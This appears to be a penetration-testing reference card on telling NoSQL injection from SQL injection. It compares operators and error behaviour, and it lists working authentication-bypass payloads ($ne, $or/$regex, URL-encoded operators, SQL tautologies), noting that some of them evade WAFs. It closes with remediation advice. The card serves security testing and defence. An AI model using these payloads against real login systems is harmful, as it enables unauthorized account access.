# NoSQL vs SQL Differentiation

## Summary
NoSQL injection differs from SQL injection in syntax, operators, and error behaviour. Correct identification ensures the right technique card is used.

## Key Differences

| Feature | SQL Injection | NoSQL Injection |
|---------|---------------|-----------------|
| Query language | SQL (SELECT, UNION, WHERE) | JSON / BSON / key-value |
| Comments | `--`, `#`, `/*` | No standard comment syntax |
| String concat | `'` + `'` | `$concat` (aggregation) |
| Boolean operators | `AND`, `OR` | `$and`, `$or`, `$nor` |
| Comparison | `=`, `>`, `LIKE` | `$eq`, `$gt`, `$regex` |
| Error output | SQL syntax errors | JSON parse errors or 200 OK |
| Union-based | `UNION SELECT` | Not directly applicable |

## Detection Probe Set

Test each payload and observe behaviour:

### Authentication Bypass Probes
```bash
# SQL-style — likely blocked by WAF
' OR '1'='1
" OR "1"="1

# NoSQL-style — often passes WAFs
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"$or": [{"username": "admin"}, {"password": {"$regex": ".*"}}]}

# URL-encoded NoSQL
username[$ne]=&password[$ne]=
username[$gt]=&password[$gt]=
```

## Response Interpretation

| Behaviour | Likely Backend |
|-----------|----------------|
| SQL error (`You have an error in your SQL syntax`) | SQL |
| JSON error (`SyntaxError`, \"CastError`) | NoSQL (MongoDB) |
| Login bypass with `$ne` but not with `OR 1=1` | NoSQL |
| `$regex` causes different results than `LIKE` | NoSQL |

## False Positives

- SQL injection also works? → SQL, not NoSQL
- `$ne` returned as literal string? → Not injectable
- Both SQL and NoSQL payloads work? → Check for multiple backends
- HTML form submits JSON? → Server may decode JSON — test both

## Remediation
- Use parameterised queries / prepared statements
- Sanitise and validate all user input before passing to queries
- Disable `$where` in production MongoDB deployments
